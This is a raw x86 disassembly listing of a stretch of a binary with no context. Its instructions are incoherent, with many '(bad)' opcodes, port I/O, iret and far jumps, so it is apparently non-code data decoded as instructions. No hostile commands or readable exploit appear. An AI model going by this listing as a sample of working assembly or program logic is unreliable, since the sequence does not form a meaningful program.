  4199a3:	lea    ecx,[ebx-0x7fa2f7ec]
  4199a9:	push   es
  4199aa:	out    dx,al
  4199ab:	sbb    edx,DWORD PTR [edx]
  4199ad:	mov    eax,0x2e004abd
  4199b2:	add    eax,esp
  4199b4:	sub    DWORD PTR [edx],esi
  4199b6:	or     edx,DWORD PTR [esp+edi*4-0x23de48f]
  4199bd:	shr    BYTE PTR [eax+ecx*2-0x575ec3bc],1
  4199c4:	ror    BYTE PTR [esi+ebx*2],0xa1
  4199c8:	cmp    edi,eax
  4199ca:	xor    dl,al
  4199cc:	call   0x425ca7c4
  4199d1:	sbb    DWORD PTR [eax+ebx*8-0x18b0afbc],ebp
  4199d8:	mov    dh,BYTE PTR [ebp+0x4]
  4199db:	dec    eax
  4199dc:	iret   
  4199dd:	mov    ah,0x10
  4199df:	add    al,0x4c
  4199e1:	mov    ch,BYTE PTR [edi-0x5]
  4199e4:	bound  ebx,QWORD PTR [ecx+ecx*1+0x50]
  4199e8:	jnp    0x4199de
  4199ea:	sbb    al,0xa4
  4199ec:	pop    eax
  4199ed:	cmp    ecx,ecx
  4199ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199f0:	mov    al,BYTE PTR [ebx-0x24]
  4199f3:	pushf  
  4199f4:	xchg   esi,eax
  4199f5:	dec    ecx
  4199f6:	sbb    ch,BYTE PTR [esi]
  4199f8:	je     0x4199b1
  4199fa:	dec    edx
  4199fb:	imul   ebp,DWORD PTR [edx+0x40],0x1c
  4199ff:	or     BYTE PTR [edi],ch
  419a01:	enter  0xb1f3,0x42
  419a05:	mov    esp,0x19106840
  419a0a:	and    ch,BYTE PTR [ebx-0x39]
  419a0d:	sub    BYTE PTR [eax+0x62],bh
  419a10:	pop    ebp
  419a11:	inc    esp
  419a12:	add    al,0xb1
  419a14:	add    ecx,DWORD PTR [eax+0x15]
  419a17:	cmova  edx,DWORD PTR [edx-0x75]
  419a1b:	stos   DWORD PTR es:[edi],eax
  419a1c:	out    0x68,eax
  419a1e:	or     DWORD PTR [edx-0x4],ecx
  419a21:	or     dh,cl
  419a23:	and    al,0xa4
  419a25:	xchg   edi,eax
  419a26:	push   0xcf542362
  419a2b:	fimul  DWORD PTR [edx-0x3fbb873]
  419a31:	call   DWORD PTR [esi-0x6201e960]
  419a37:	bndldx (bad),[esp+eiz*2+0x5a2a058f]
  419a3f:	and    DWORD PTR [eax-0x4],edi
  419a42:	add    DWORD PTR [edi+eax*1],edx
  419a45:	adc    bl,al
  419a47:	adc    cl,bh
  419a49:	inc    eax
  419a4a:	xchg   ebx,eax
  419a4b:	ret    0x1856
  419a4e:	enter  0x9736,0x51
  419a52:	ss dec ebp
  419a54:	push   esp
  419a55:	and    dh,ah
  419a57:	sbb    al,0xcf
  419a59:	(bad)  
  419a5a:	int3   
  419a5b:	pop    es
  419a5c:	bound  esp,QWORD PTR [eax+0xa]
  419a5f:	pop    ebx
  419a60:	leave  
  419a61:	dec    ecx
  419a62:	inc    edx
  419a63:	cmp    eax,0x21de7d97
  419a68:	in     al,dx
  419a69:	(bad)  
  419a6a:	fdivr  DWORD PTR [ebx+0x20650457]
  419a70:	pop    ebx
  419a71:	gs es (bad) 
  419a74:	mov    ebx,0x705acbd
  419a79:	jb     0x419a7f
  419a7b:	cwde   
  419a7c:	(bad)  
  419a7d:	repz push esp
  419a7f:	dec    esi
  419a80:	popa   
  419a81:	xor    eax,edi
  419a83:	cmp    dl,cl
  419a85:	enter  0x980b,0x90
  419a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a8b:	and    edx,ebp
  419a8d:	clc    
  419a8e:	int    0xac
  419a90:	mov    cl,bh
  419a92:	and    ah,BYTE PTR [edi-0x66f38780]
  419a98:	inc    BYTE PTR [ebp+ebx*8+0x7d]
  419a9c:	and    ah,ch
  419a9e:	ret    
  419a9f:	cmp    al,0x45
  419aa1:	push   cs
  419aa2:	or     DWORD PTR [esp+eax*8+0x52],edx
  419aa6:	arpl   WORD PTR gs:[eax],cx
  419aa9:	inc    esp
  419aaa:	mov    ch,0xb0
  419aac:	add    BYTE PTR [eax-0x754bfe30],bh
  419ab2:	mov    bl,0x7a
  419ab4:	jno    0x419a4e
  419ab6:	call   DWORD PTR [edx]
  419ab8:	lea    ebp,[eax+0x48]
  419abb:	mov    WORD PTR [esi+0x6],fs
  419abe:	jg     0x419ac9
  419ac0:	cmp    esi,DWORD PTR [ebx*8+0x6ff994f4]
  419ac7:	add    ebx,DWORD PTR [ebp+0x150df175]
  419acd:	mov    ecx,DWORD PTR [ebx*8-0x602be408]
  419ad4:	dec    ebx
  419ad5:	and    eax,0x9c865860
  419ada:	jmp    0x419af9
  419adc:	mov    al,0xc6
  419ade:	fsub   DWORD PTR [ebp+0x542253da]
  419ae4:	cld    
  419ae5:	outs   dx,DWORD PTR ds:[esi]
  419ae6:	(bad)  
  419ae7:	repz push ds
  419ae9:	sbb    esp,ecx
  419aeb:	or     ebx,DWORD PTR [edi+eax*4]
  419aee:	retf   
  419aef:	jo     0x419afd
  419af1:	pop    ecx
  419af2:	pop    edx
  419af3:	pop    ds
  419af4:	mov    esp,0x122c017f
  419af9:	cmc    
  419afa:	or     dl,BYTE PTR [eax+ebp*8-0x80]
  419afe:	push   0x5386e0d7
  419b03:	sub    al,dl
  419b05:	dec    dl
  419b07:	outs   dx,BYTE PTR ds:[esi]
  419b08:	add    edx,DWORD PTR [eax]
  419b0a:	dec    edx
  419b0b:	pop    es
  419b0c:	xchg   edi,eax
  419b0d:	sub    bl,dh
  419b0f:	sub    DWORD PTR [esi],edx
  419b11:	jb     0x419b25
  419b13:	dec    edi
  419b14:	adc    eax,0xc40858c
  419b19:	sahf   
  419b1a:	ins    DWORD PTR es:[edi],dx
  419b1b:	jmp    0x419b48
  419b1d:	pop    es
  419b1e:	nop
  419b1f:	and    esi,DWORD PTR [ecx]
  419b21:	jae    0x419aa8
  419b23:	mov    cs,WORD PTR [ebx-0xb]
  419b26:	adc    al,0xf2
  419b28:	test   al,0x48
  419b2a:	xchg   edi,eax
  419b2b:	imul   eax,DWORD PTR [ebp+0x16eecadd],0x39
  419b32:	jmp    0x419b3b
  419b34:	or     BYTE PTR [eax-0x163db8ac],cl
  419b3a:	repz add eax,0x73b944cf
  419b40:	fwait
  419b41:	loopne 0x419b44
  419b43:	int    0xfa
  419b45:	adc    BYTE PTR [ebp+0x68bef0fc],0x49
  419b4c:	jbe    0x419b02
  419b4e:	enter  0x7399,0x42
  419b52:	rcr    DWORD PTR [eax-0x7d54fbd2],cl
  419b58:	and    BYTE PTR [ecx+0xa0b779c],0xd1
  419b5f:	and    BYTE PTR [ebp+0x2ca98bfc],bl
  419b65:	xchg   edi,eax
  419b66:	ins    DWORD PTR es:[edi],dx
  419b67:	imul   ecx,DWORD PTR [ebx],0xffffffc5
  419b6a:	in     al,dx
  419b6b:	push   es
  419b6c:	lock jge 0x419b63
  419b6f:	clc    
  419b70:	daa    
  419b71:	jns    0x419ba6
  419b73:	xor    eax,0x2a4be48f
  419b78:	loopne 0x419b1b
  419b7a:	les    ecx,FWORD PTR [ebp-0x20]
  419b7d:	and    al,0xa2
  419b7f:	xchg   ebx,eax
  419b80:	or     eax,0xd85f6818
  419b85:	popa   
  419b86:	add    BYTE PTR [edx],al
  419b88:	sar    BYTE PTR [edi+ecx*8+0x1462e099],1
  419b8f:	pop    ds
  419b90:	js     0x419b56
  419b92:	call   0xcccb8ed5
  419b97:	out    dx,al
  419b98:	data16 mov cl,0x4d
  419b9b:	lds    ebp,FWORD PTR [ebp+0x0]
  419b9e:	mov    esp,0x288928bb
  419ba3:	(bad)  
  419ba4:	call   0x7d69f802
  419ba9:	rol    DWORD PTR [eax+eiz*8],0x89
  419bad:	aam    0x4f
  419baf:	sahf   
  419bb0:	sub    al,0x4c
  419bb2:	pop    ds
  419bb3:	addr16 fmul st(0),st
  419bb6:	pop    edi
  419bb7:	pop    eax
  419bb8:	call   0x6782e3ef
  419bbd:	xor    eax,0xe4592d00
  419bc2:	(bad)  
  419bc3:	mov    WORD PTR [ebx+edx*2],cs
  419bc6:	push   ebp
  419bc7:	cmp    al,0x48
  419bc9:	je     0x419c13
  419bcb:	jmp    0x419c22
  419bcd:	addr16 fs nop
  419bd0:	aas    
  419bd1:	xor    esi,DWORD PTR [edi+esi*1-0x15]
  419bd5:	inc    edi
  419bd6:	xor    eax,0x66ff6c28
  419bdb:	in     al,0x16
  419bdd:	jmp    0x419c0e
  419bdf:	and    eax,0xb021eb1d
  419be4:	add    eax,ebx
  419be6:	mov    al,0x4
  419be8:	add    al,BYTE PTR ds:0xb2cb2cb2
  419bee:	push   es
  419bef:	pop    es
  419bf0:	or     BYTE PTR [ecx],cl
  419bf2:	or     edx,DWORD PTR [edx-0x4c]
  419bf5:	sub    al,0xcb
  419bf7:	or     al,0xd
  419bf9:	push   cs
  419bfa:	push   ss
  419bfb:	scas   eax,DWORD PTR es:[edi]
  419bfc:	or     dl,BYTE PTR [ebx+0x188a4e11]
  419c02:	test   al,0x8b
  419c04:	mov    edi,ecx
  419c06:	inc    eax
  419c07:	out    0x81,al
  419c09:	push   ebx
  419c0a:	mov    WORD PTR [esi+0x8],es
  419c0d:	loop   0x419b9b
  419c0f:	mov    WORD PTR [ebp+eax*1-0x50],gs
  419c13:	test   al,0xac
  419c15:	cmp    ah,BYTE PTR [edx]
  419c17:	enter  0x3db1,0x77
  419c1b:	pushf  
  419c1c:	gs pop eax
  419c1e:	in     al,0xc3
  419c20:	(bad)  
  419c21:	sub    eax,0x7d147b92
  419c26:	setae  BYTE PTR [esi*8+0x109c9381]
  419c2e:	mov    ds:0xf7184388,al
  419c33:	mov    eax,0xc481c095
  419c38:	repnz or ecx,DWORD PTR [eax+edx*2]
  419c3c:	in     eax,0x17
  419c3e:	aad    0x33
  419c40:	les    edi,FWORD PTR [ebp-0x14]
  419c43:	jo     0x419bca
  419c45:	mov    dh,0x8c
  419c47:	add    DWORD PTR [esi+eax*1],ecx
  419c4a:	test   eax,0xdae047d7
  419c4f:	jmp    0x419bd3
  419c51:	sbb    DWORD PTR [edi+0x32a49970],esp
  419c57:	les    ebx,FWORD PTR [edx-0x127f96f]
  419c5d:	dec    BYTE PTR [ebp-0xafa6c73]
  419c63:	sbb    ah,BYTE PTR [ecx]
  419c65:	sub    eax,0xdd838be4
  419c6a:	mov    ebp,0x10b51560
  419c6f:	push   edi
  419c70:	dec    esp
  419c71:	mov    eax,eax
  419c73:	mov    esp,0x633418d8
  419c78:	cmp    eax,eax
  419c7a:	or     edx,DWORD PTR [edx]
  419c7c:	les    ecx,FWORD PTR [edi]
  419c7e:	es and ebx,ebx
  419c81:	leave  
  419c82:	enter  0x59f8,0xcc
  419c86:	sar    BYTE PTR [esi-0x53],1
  419c89:	add    ecx,esi
  419c8b:	data16 mov es,WORD PTR [esi-0xa]
  419c8f:	mov    eax,ds:0xbc7649b8
  419c94:	leave  
  419c95:	ror    DWORD PTR [ebp+0x5da03c0f],0xc6
  419c9c:	into   
  419c9d:	fcomp  st(0)
  419c9f:	jmp    0x419cfe
  419ca1:	cwde   
  419ca2:	nop
  419ca3:	ds xchg esp,eax
  419ca5:	pop    esi
  419ca6:	cwde   
  419ca7:	xchg   ebx,eax
  419ca8:	xchg   ecx,eax
  419ca9:	dec    ecx
  419caa:	inc    esi
  419cab:	pushf  
  419cac:	mov    al,ds:0x96792ea4
  419cb1:	xchg   ecx,eax
  419cb2:	nop
  419cb3:	add    cl,BYTE PTR [esp+ecx*4+0x4058798c]
  419cba:	dec    edx
  419cbb:	add    DWORD PTR [esi-0x64],edi
  419cbe:	mov    al,0x8e
  419cc0:	xor    BYTE PTR [esp+ecx*4+0x6a03ba91],ah
  419cc7:	xchg   edx,eax
  419cc8:	sub    al,BYTE PTR [ebx-0x3a]
  419ccb:	scas   al,BYTE PTR es:[edi]
  419ccc:	aad    0xdf
  419cce:	or     BYTE PTR [eax+0x56],0xc1
  419cd2:	imul   eax,DWORD PTR [edi],0xffffff8c
  419cd5:	and    eax,0x9d43914f
  419cda:	push   es
  419cdb:	rol    BYTE PTR [ebx-0x5c8ee449],1
  419ce1:	ret    0xea57
  419ce4:	or     bh,dh
  419ce6:	sbb    eax,0x730a074a
  419ceb:	std    
  419cec:	outs   dx,BYTE PTR ds:[esi]
  419ced:	add    esp,DWORD PTR [edx+eiz*1+0x553bf1c1]
  419cf4:	xor    esi,DWORD PTR [eax+0x409a4159]
  419cfa:	ror    DWORD PTR [edx],1
  419cfc:	xor    BYTE PTR [edi+0x6b],dh
  419cff:	frstor [edi+ebx*2]
  419d02:	xchg   esi,eax
  419d03:	hlt    
  419d04:	add    al,dh
  419d06:	mov    eax,ds:0xcff0f38c
  419d0b:	adc    BYTE PTR [esi],ch
  419d0d:	stc    
  419d0e:	inc    ebp
  419d0f:	xchg   edx,eax
  419d10:	pop    ecx
  419d11:	xor    BYTE PTR [eax+0x2ac30658],bh
  419d17:	sub    BYTE PTR [ebp*1-0x1a823fc0],bl
  419d1e:	inc    esi
  419d1f:	enter  0x9d4a,0xcb
  419d23:	enter  0x15d4,0x2b
  419d27:	jmp    0x720e:0xbd0b1e11
  419d2e:	mov    dl,0xc7
  419d30:	int3   
  419d31:	add    al,0x58
  419d33:	mov    ds:0x1c873687,eax
  419d38:	mov    ecx,0x8cf46816
  419d3d:	pop    esp
  419d3e:	nop
  419d3f:	mov    eax,ds:0x2d6b6498
  419d44:	in     eax,0x2c
  419d46:	fcomp  st(0)
  419d48:	loopne 0x419d54
  419d4a:	clc    
  419d4b:	fld    TBYTE PTR [esp+ecx*2]
  419d4e:	jae    0x419da4
  419d50:	popf   
  419d51:	rol    ch,0x7f
  419d54:	mov    eax,ds:0xb1cd2397
  419d59:	lock and bl,BYTE PTR [edx+ebx*4-0x47637704]
  419d61:	call   0x9f795c9e
  419d66:	cdq    
  419d67:	js     0x419d5d
  419d69:	add    bh,BYTE PTR [eax-0x77f365fc]
  419d6f:	repz fbld TBYTE PTR [ebp+0x720fa877]
  419d76:	mov    dl,0x1a
  419d78:	mov    eax,ds:0xb145c607
  419d7d:	inc    esi
  419d7e:	add    DWORD PTR [eax-0x29d26ff8],ecx
  419d84:	push   ds
  419d85:	push   esi
  419d86:	(bad)  
  419d87:	(bad)  
  419d88:	and    dl,BYTE PTR [eax+0x6437a227]
  419d8e:	nop
  419d8f:	or     BYTE PTR [ebx-0x14],ch
  419d92:	xor    eax,0x9b227324
  419d97:	mov    ds:0x43089910,eax
  419d9c:	push   cs
  419d9d:	cmp    esp,esp
  419d9f:	shl    al,0xfc
  419da2:	xchg   esp,eax
  419da3:	dec    ebx
  419da4:	xchg   ecx,ecx
  419da6:	js     0x419d9c
  419da8:	adc    esi,DWORD PTR [eax+0x5c86ff6c]
  419dae:	aam    0x16
  419db0:	gs xchg esp,eax
  419db2:	les    esi,FWORD PTR [ecx+0x15]
  419db5:	lahf   
  419db6:	sub    ah,cl
  419db8:	inc    ebx
  419db9:	mov    esp,0x9abca374
  419dbe:	stc    
  419dbf:	in     al,0xae
  419dc1:	and    al,0x8
  419dc3:	add    al,0xa3
  419dc5:	ror    BYTE PTR [eax],0xa3
  419dc8:	les    ecx,FWORD PTR [esi-0x1de7d35]
  419dce:	pop    ss
  419dcf:	add    DWORD PTR [ebp+0x10],esi
  419dd2:	pop    es
  419dd3:	stc    
  419dd4:	jmp    DWORD PTR [ebx-0x46e509c5]
  419dda:	enter  0x610,0xf
  419dde:	or     bh,BYTE PTR [eax-0x6f2fb34]
  419de4:	push   esi
  419de5:	xchg   esp,eax
  419de6:	cmp    eax,0x80b914
  419deb:	fdiv   QWORD PTR [ebp-0x10a011a9]
  419df1:	sar    BYTE PTR [ebx+0x62],0x66
  419df5:	cmp    BYTE PTR [esi+eax*2],0x2d
  419df9:	add    BYTE PTR [ebp-0xf],bl
  419dfc:	pusha  
  419dfd:	addr16 adc al,0x48
  419e00:	ins    DWORD PTR es:[edi],dx
  419e01:	lock or edx,DWORD PTR [edi]
  419e04:	dec    esp
  419e05:	jp     0x419df2
  419e07:	dec    eax
  419e08:	mov    esi,edi
  419e0a:	dec    esi
  419e0b:	pushf  
  419e0c:	dec    esi
  419e0d:	lahf   
  419e0e:	mov    bl,0xbf
  419e10:	push   eax
  419e11:	xor    BYTE PTR [edx],dl
  419e13:	mov    cl,BYTE PTR [eax+esi*1]
  419e16:	and    ecx,0xe9720d1f
  419e1c:	mov    BYTE PTR [eax+0x4b],ch
  419e1f:	adc    al,0x2
  419e21:	into   
  419e22:	adc    bh,BYTE PTR [edi+0x9]
  419e25:	loop   0x419e16
  419e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e28:	jns    0x419e2f
  419e2a:	dec    ecx
  419e2b:	or     ecx,0xfffffffe
  419e2e:	inc    ecx
  419e2f:	add    DWORD PTR [edx+esi*4],0x2
  419e33:	jmp    0x419e48
  419e35:	mov    dl,ch
  419e37:	mov    al,ds:0x3804d84c
  419e3c:	dec    ecx
  419e3d:	add    ah,BYTE PTR [esi]
  419e3f:	mov    bl,BYTE PTR [ecx]
  419e41:	pushf  
  419e42:	add    DWORD PTR [ebx+0x56],edi
  419e45:	adc    al,BYTE PTR [ebx+0x28]
  419e48:	dec    edx
  419e49:	int3   
  419e4a:	popf   
  419e4b:	dec    edi
  419e4c:	xor    BYTE PTR [esi-0x1bbf89df],0x8e
  419e53:	aam    0x77
  419e55:	xor    ecx,ecx
  419e57:	sbb    eax,0x1d88adb2
  419e5c:	pop    es
  419e5d:	adc    esp,DWORD PTR ds:0xf60a3bc1
  419e63:	and    ah,al
  419e65:	lods   al,BYTE PTR ds:[esi]
  419e66:	lock jle 0x419e72
  419e69:	or     ah,BYTE PTR [ecx+0x168b98e2]
  419e6f:	or     cl,BYTE PTR [edi-0x2ba45850]
  419e75:	add    ecx,DWORD PTR [esi+ebx*4]
  419e78:	in     eax,dx
  419e79:	mov    ds:0x86020d46,al
  419e7e:	inc    ebp
  419e7f:	ds scas eax,DWORD PTR es:[edi]
  419e81:	mov    esi,0xefb0e01d
  419e86:	pop    eax
  419e87:	xor    BYTE PTR [eax+eiz*1+0x257cfb3b],ch
  419e8e:	pop    ebx
  419e8f:	nop
  419e90:	and    eax,DWORD PTR [ecx]
  419e92:	sbb    ecx,DWORD PTR ds:0x46d895
  419e98:	pop    ebx
  419e99:	adc    ebx,DWORD PTR [ecx+0xe7d2445]
  419e9f:	fs aam 0x2c
  419ea2:	stos   BYTE PTR es:[edi],al
  419ea3:	das    
  419ea4:	sbb    eax,DWORD PTR [ebx]
  419ea6:	dec    esp
  419ea7:	adc    ebp,DWORD PTR [edx]
  419ea9:	inc    eax
  419eaa:	cmp    al,0xfc
  419eac:	dec    edx
  419ead:	mov    dh,0x23
  419eaf:	shl    DWORD PTR [ecx+eiz*1],0x46
  419eb3:	push   esp
  419eb4:	pop    ds
  419eb5:	retf   0xbffd
  419eb8:	in     al,0xc7
  419eba:	cmp    ebx,DWORD PTR [ebp-0xc]
  419ebd:	jge    0x419ec4
  419ebf:	cmp    esi,DWORD PTR [ebp-0x4]
  419ec2:	jl     0x419e99
  419ec4:	add    al,0x93
  419ec6:	dec    esp
  419ec7:	fst    DWORD PTR [edi-0x23]
  419eca:	push   cs
  419ecb:	push   ds
  419ecc:	xor    ecx,DWORD PTR [eax+ecx*2]
  419ecf:	push   0x17
  419ed1:	loopne 0x419f45
  419ed3:	test   DWORD PTR [eax-0x7fe7761e],0x17301162
  419edd:	inc    edi
  419ede:	cwde   
  419edf:	mov    WORD PTR [edx],ds
  419ee1:	adc    BYTE PTR [ecx+0x4a],cl
  419ee4:	aad    0x3f
  419ee6:	add    bl,BYTE PTR [esi]
  419ee8:	jbe    0x419e8b
  419eea:	xor    BYTE PTR [esi+0x37],bh
  419eed:	repnz cs push esp
  419ef0:	stos   DWORD PTR es:[edi],eax
  419ef1:	cli    
  419ef2:	pop    ecx
  419ef3:	and    al,0x28
  419ef5:	and    BYTE PTR [eax-0x2ac4b4f4],dl
  419efb:	inc    eax
  419efc:	xor    BYTE PTR [ecx],bl
  419efe:	jno    0x419f7f
  419f00:	or     al,0xb6
  419f02:	jg     0x419ea8
  419f04:	add    BYTE PTR [edx-0xf72c99],bh
  419f0a:	add    al,0x3
  419f0c:	sub    eax,0x458b2980
  419f11:	dec    ebp
  419f12:	arpl   WORD PTR [esi+0x36],ax
  419f15:	and    al,0x80
  419f17:	leave  
  419f18:	ins    BYTE PTR es:[edi],dx
  419f19:	or     DWORD PTR [edx+0x67],edx
  419f1c:	rol    DWORD PTR gs:[edx+0x5f66261c],0x65
  419f24:	and    ebx,DWORD PTR [ebx]
  419f26:	in     al,dx
  419f27:	jge    0x419f38
  419f29:	or     ecx,DWORD PTR [ecx+0x56353c5f]
  419f2f:	sti    
  419f30:	jecxz  0x419f3c
  419f32:	push   ebx
  419f33:	cli    
  419f34:	in     al,0x2b
  419f36:	ret    
  419f37:	adc    eax,0xcd515b20
  419f3c:	add    BYTE PTR [ebp-0x29],0x17
  419f40:	bound  esi,QWORD PTR [ebx+0x33bd618a]
  419f46:	and    edx,DWORD PTR [ecx+0x3bc3fe13]
  419f4c:	and    cl,BYTE PTR [edx-0x7e00ccac]
  419f52:	loop   0x419f94
  419f54:	adc    eax,0x187c14ea
  419f59:	pop    ebp
  419f5a:	add    eax,esi
  419f5c:	dec    eax
  419f5d:	(bad)  
  419f5e:	xor    eax,0xf3105e28
  419f63:	int3   
  419f64:	loope  0x419f58
  419f66:	nop
  419f67:	sub    al,0x87
  419f69:	cmp    DWORD PTR [esi+ebx*1],esp
  419f6c:	adc    DWORD PTR [ebx+0x6d5180c6],ecx
  419f72:	jb     0x419f37
  419f74:	pop    es
  419f75:	das    
  419f76:	sbb    eax,DWORD PTR [esi+0x6d]
  419f79:	rcr    dl,1
  419f7b:	neg    BYTE PTR ss:[edx]
  419f7e:	arpl   WORD PTR [ebp+0x31],dx
  419f81:	jmp    0x8190:0xb81e0a31
  419f88:	or     DWORD PTR [edi+0x15],esi
  419f8b:	stos   DWORD PTR es:[edi],eax
  419f8c:	sub    esi,edi
  419f8e:	rcl    BYTE PTR [edx+0x5a2c680a],0x8b
  419f95:	dec    eax
  419f96:	je     0x419f5a
  419f98:	pop    ss
  419f99:	mov    al,ch
  419f9b:	dec    ecx
  419f9c:	in     eax,dx
  419f9d:	test   bl,bl
  419f9f:	sbb    DWORD PTR [edx-0x59827f18],0x89111991
  419fa9:	pop    esp
  419faa:	cmp    eax,0x103f3dd3
  419faf:	and    BYTE PTR [ebx+0x61],0x8e
  419fb3:	pop    ecx
  419fb4:	cmp    eax,0xecc9f0aa
  419fb9:	adc    dl,al
  419fbb:	ret    
  419fbc:	mov    cl,0xd7
  419fbe:	adc    eax,0x44472c59
  419fc3:	or     eax,0x802b3c37
  419fc8:	cmp    eax,0xfb47708f
  419fcd:	add    dh,BYTE PTR [eax+eax*1+0xc]
  419fd1:	mov    esp,0x566619b6
  419fd6:	add    eax,ebp
  419fd8:	cmp    al,0xa0
  419fda:	in     eax,dx
  419fdb:	mov    dl,0x51
  419fdd:	clc    
  419fde:	sbb    BYTE PTR [edx],dh
  419fe0:	arpl   WORD PTR [ebx],bx
  419fe2:	(bad)  
  419fe3:	pushf  
  419fe4:	xor    ebx,ebp
  419fe6:	add    al,BYTE PTR [esp+eax*1+0x45]
  419fea:	lods   eax,DWORD PTR ds:[esi]
  419feb:	aas    
  419fec:	adc    al,0xb0
  419fee:	sbb    ecx,DWORD PTR [edi]
  419ff0:	adc    BYTE PTR [ebx],ch
  419ff2:	lds    ebx,FWORD PTR [ebx-0x30]
  419ff5:	cmp    esi,edx
  419ff7:	xor    ah,BYTE PTR [esi-0x79]
  419ffa:	fdiv   DWORD PTR [esi-0x59]
  419ffd:	mov    ds:0xa16bbda2,al
  41a002:	mov    ds:0xc916dea1,al
  41a007:	push   es
  41a008:	add    edx,DWORD PTR ds:0x93733d4d
  41a00e:	push   eax
  41a00f:	sahf   
  41a010:	sbb    ebx,DWORD PTR ds:0xd660159
  41a016:	pop    ebp
  41a017:	sbb    BYTE PTR [esi],cl
  41a019:	mov    ds:0x86af0821,al
  41a01e:	push   0xeec1e837
  41a023:	pop    esi
  41a024:	ror    BYTE PTR [esi],1
  41a026:	xchg   DWORD PTR [edi],eax
  41a028:	inc    edx
  41a029:	enter  0x2b71,0x40
  41a02d:	lock stos BYTE PTR es:[edi],al
  41a02f:	xor    eax,0x26a1f28a
  41a034:	push   esp
  41a035:	jg     0x41a0ab
  41a037:	daa    
  41a038:	mov    edx,DWORD PTR [edi]
  41a03a:	sub    edx,esi
  41a03c:	aam    0xb8
  41a03e:	shl    BYTE PTR [ebp+0x74187a2d],cl
  41a044:	add    al,BYTE PTR [edi+eax*1+0x22072601]
  41a04b:	pop    esi
  41a04c:	rcr    DWORD PTR [esi+0x75],1
  41a04f:	(bad)  ds:0x79b20353
  41a055:	sahf   
  41a056:	jg     0x41a04c
  41a058:	hlt    
  41a059:	add    BYTE PTR [ecx+edi*8+0x262bc1ce],ah
  41a060:	mov    ss,esp
  41a062:	adc    DWORD PTR [edx+0x7f11480d],ecx
  41a068:	hlt    
  41a069:	sbb    BYTE PTR [edx],dh
  41a06b:	sbb    BYTE PTR [ebx],ah
  41a06d:	cmp    al,cl
  41a06f:	pop    eax
  41a070:	push   edx
  41a071:	fdivr  DWORD PTR [eax+eiz*4+0x773c806]
  41a078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a079:	hlt    
  41a07a:	or     al,0x7e
  41a07c:	mov    ds:0x267d8bc9,eax
  41a081:	(bad)  
  41a082:	in     al,dx
  41a083:	push   edi
  41a084:	mov    eax,ds:0xaabb0038
  41a089:	xor    esi,esi
  41a08b:	xchg   ebx,eax
  41a08c:	cwde   
  41a08d:	dec    ebp
  41a08e:	pop    esp
  41a08f:	adc    al,0xd7
  41a091:	aaa    
  41a092:	push   es
  41a093:	enter  0xfd20,0xff
  41a097:	mov    bl,BYTE PTR [edi+esi*1+0x7]
  41a09b:	sub    bl,al
  41a09d:	jb     0x41a0b9
  41a09f:	inc    ebx
  41a0a0:	mov    BYTE PTR [ebp-0x1],al
  41a0a3:	mov    al,BYTE PTR [ebp-0x2c]
  41a0a6:	stos   DWORD PTR es:[edi],eax
  41a0a7:	retf   
  41a0a8:	out    dx,eax
  41a0a9:	(bad)  
  41a0aa:	(bad)  
  41a0ac:	push   cs
  41a0ad:	dec    bl
  41a0af:	jne    0x41a09b
  41a0b1:	add    esi,0x2
  41a0b4:	cmp    esi,0xc
  41a0b7:	jge    0x41a0c3
  41a0b9:	sub    eax,0x6375440a
  41a0be:	inc    esp
  41a0bf:	or     al,0x80
  41a0c1:	enter  0x76d,0xf8
  41a0c5:	adc    eax,0x1feba26d
  41a0ca:	ja     0x41a0d3
  41a0cc:	add    al,0xdc
  41a0ce:	mov    ch,0xf
  41a0d0:	xchg   edx,eax
  41a0d1:	mov    esi,0x5f782fcf
  41a0d6:	inc    edi
  41a0d7:	fs inc bh
  41a0da:	add    eax,0xcf320976
  41a0df:	mov    bl,0x19
  41a0e1:	fimul  DWORD PTR [ecx]
  41a0e3:	cmp    al,0x0
  41a0e5:	inc    eax
  41a0e6:	scas   eax,DWORD PTR es:[edi]
  41a0e7:	or     ebx,DWORD PTR [esi]
  41a0e9:	jno    0x41a0f9
  41a0eb:	jbe    0x41a06f
  41a0ed:	mov    ds:0xd8ea0325,eax
  41a0f2:	mov    edx,0xe41b0966
  41a0f7:	data16 fld QWORD PTR [ebx]
  41a0fa:	arpl   di,bx
  41a0fc:	pop    ss
  41a0fd:	xor    BYTE PTR [edi-0x77],0x15
  41a101:	xor    BYTE PTR [ecx+eax*8],cl
  41a104:	call   0xbe734413
  41a109:	sbb    al,0x8a
  41a10b:	jle    0x41a0e8
  41a10d:	loopne 0x41a0b4
  41a10f:	pop    esp
  41a110:	mov    edi,0x2708b998
  41a115:	js     0x41a0cd
  41a117:	rcr    BYTE PTR [ecx],1
  41a119:	push   esi
  41a11a:	add    cl,dl
  41a11c:	lods   eax,DWORD PTR ds:[esi]
  41a11d:	dec    ebx
  41a11e:	xchg   esp,eax
  41a11f:	ins    BYTE PTR es:[edi],dx
  41a120:	jo     0x41a0d8
  41a122:	rcr    DWORD PTR [ebx+0x5c613df],cl
  41a128:	inc    ebp
  41a129:	sub    DWORD PTR [esi],eax
  41a12b:	inc    esp
  41a12c:	out    dx,eax
  41a12d:	fucomi st,st(2)
  41a12f:	fst    QWORD PTR [edx*4+0x6e1c55d5]
  41a136:	mov    eax,0x1d45ba3b
  41a13b:	out    dx,eax
  41a13c:	outs   dx,DWORD PTR ds:[esi]
  41a13d:	mov    al,ds:0xb41c8cb1
  41a142:	setne  bl
  41a145:	mov    BYTE PTR ds:0xa0c1126,bl
  41a14b:	cmp    eax,0x303766ce
  41a150:	mov    eax,0xefd02dd0
  41a155:	sbb    eax,DWORD PTR [edx]
  41a157:	add    al,0x88
  41a159:	add    al,BYTE PTR [eax+0x42]
  41a15c:	cmp    eax,0x16f575ad
  41a161:	push   0x14
  41a163:	scas   eax,DWORD PTR es:[edi]
  41a164:	add    dl,BYTE PTR [eax]
  41a166:	sbb    edx,DWORD PTR [eax+0x66]
  41a169:	rcl    BYTE PTR [eax-0x3c],1
  41a16c:	js     0x41a1d6
  41a16e:	imul   bh
  41a170:	add    bh,ch
  41a172:	add    eax,0xbf5de13b
  41a177:	lods   al,BYTE PTR ds:[esi]
  41a178:	cmp    esp,DWORD PTR [ecx]
  41a17a:	cmp    WORD PTR [edx],0xffb4
  41a17e:	adc    al,0xf1
